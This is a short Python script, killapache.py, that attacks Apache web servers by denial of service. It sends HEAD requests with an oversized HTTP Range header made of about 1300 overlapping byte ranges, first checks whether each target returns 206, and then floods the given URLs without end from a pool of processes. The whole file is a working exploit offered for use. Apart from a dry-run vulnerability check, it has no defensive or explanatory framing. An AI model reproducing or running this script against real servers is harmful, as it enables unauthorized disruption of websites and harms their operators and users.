#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  killapache.py
#  
#  Copyright 2012 Thomas Grainger <graingert@ufo>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  

import argparse
import requests
from multiprocessing import Pool

bad_range = ""
for k in range(1300):
    bad_range += ",5-{k}".format(k=k)
    
headers = {"Range": "bytes=0-{bad_range}".format(bad_range=bad_range)}

def testapache(urls):
    
    headers = {"Range": "bytes=0-,5-0,5-1,5-2,5-3,5-4,5-5,5-6,5-7,5-8,5-9"}
    vuln = True
    
    for url in urls:
        r = requests.head(url, headers=headers)
        print "{url}\t{status_code}".format(url=url,status_code=r.status_code)
        if not r.status_code == 206:
            vuln = False
    return vuln

def _kill(url):
     r = requests.head(url, headers=headers)
    
def killapache(urls, processes):
    pool = Pool(processes=processes)
    for url in urls:
        print "ATTACKING {url} [using {processes} processes]".format(url=url, processes=processes)
        pool.map(_kill, [url for i in range(processes)], 1)
        print "All processes returned"


def main():
    parser = argparse.ArgumentParser(prog="killapache", description='Kill Apache at a given URLs')
    parser.add_argument('urls', metavar='URL', type=str, nargs='+', help='An URL hosted by the server to attack')
    parser.add_argument('-p','--processes',
                        type=int,
                        action='store',
                        default=50,
                        dest='processes',
                        help="The number of processes to use in the attack"
    )
    parser.add_argument('-d', '--dry-run',
                        action='store_true',
                        help='Check if hosts are vulnerable',
                        dest="dry",
    )
    
    args = parser.parse_args()

    if (testapache(args.urls) and not args.dry):
        while True:
            killapache(args.urls, args.processes)
    
    return 0

if __name__ == '__main__':
    main()

